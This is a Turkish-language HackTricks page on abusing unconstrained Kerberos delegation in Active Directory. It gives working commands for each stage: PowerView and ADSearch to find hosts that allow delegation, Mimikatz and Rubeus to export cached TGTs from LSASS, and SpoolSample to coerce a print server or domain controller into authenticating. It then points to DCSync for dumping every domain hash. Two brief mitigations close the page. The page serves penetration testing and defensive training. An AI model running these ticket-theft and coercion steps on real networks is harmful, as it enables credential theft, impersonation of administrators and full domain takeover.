# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Bu, bir Alan Yöneticisinin alan içindeki herhangi bir **Bilgisayar** için ayarlayabileceği bir özelliktir. Daha sonra, bir **kullanıcı Bilgisayara giriş yaptığında**, o kullanıcının **TGT'sinin bir kopyası** DC tarafından sağlanan **TGS'ye gönderilecek** ve **LSASS'ta bellekte saklanacaktır**. Bu nedenle, makinede Yönetici ayrıcalıklarınız varsa, **biletleri dökebilir ve kullanıcıları taklit edebilirsiniz**.

Bu nedenle, "Unconstrained Delegation" özelliği etkinleştirilmiş bir Bilgisayara giriş yapan bir alan yöneticisi varsa ve o makinede yerel yönetici ayrıcalıklarınız varsa, bileti dökebilir ve Alan Yöneticisini her yerde taklit edebilirsiniz (alan privesc).

Bu **özelliğe sahip Bilgisayar nesnelerini bulabilirsiniz**; [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) niteliğinin [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) içerip içermediğini kontrol ederek. Bunu ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ LDAP filtresi ile yapabilirsiniz; bu, powerview'ün yaptığıdır:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Yönetici (veya kurban kullanıcı) biletini bellekte **Mimikatz** veya **Rubeus** ile yükleyin **[**Pass the Ticket**](pass-the-ticket.md)**.**\
Daha fazla bilgi: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Ired.team'de Kısıtlanmamış delegasyon hakkında daha fazla bilgi.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Kimlik Doğrulamayı Zorla**

Eğer bir saldırgan **"Kısıtlanmamış Delegasyon"** için izin verilen bir bilgisayarı **ele geçirebilirse**, bir **Yazıcı sunucusunu** **otomatik olarak giriş yapmaya** **kandırabilir** ve bu sayede sunucunun belleğinde bir TGT **kaydedebilir**.\
Sonrasında, saldırgan kullanıcı Yazıcı sunucu bilgisayar hesabını taklit etmek için **Pass the Ticket saldırısı** gerçekleştirebilir.

Bir yazıcı sunucusunun herhangi bir makineye giriş yapmasını sağlamak için [**SpoolSample**](https://github.com/leechristensen/SpoolSample) kullanabilirsiniz:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Eğer TGT bir etki alanı denetleyicisinden geliyorsa, [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) gerçekleştirebilir ve DC'den tüm hash'leri elde edebilirsiniz.\
[**Bu saldırı hakkında daha fazla bilgi ired.team'de.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

Burada **kimlik doğrulamayı zorlamak için** diğer yolları bulun:

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Mitigasyon

- DA/Admin oturum açmalarını belirli hizmetlerle sınırlayın
- Ayrıcalıklı hesaplar için "Hesap hassastır ve devredilemez" ayarını yapın.

{{#include ../../banners/hacktricks-training.md}}
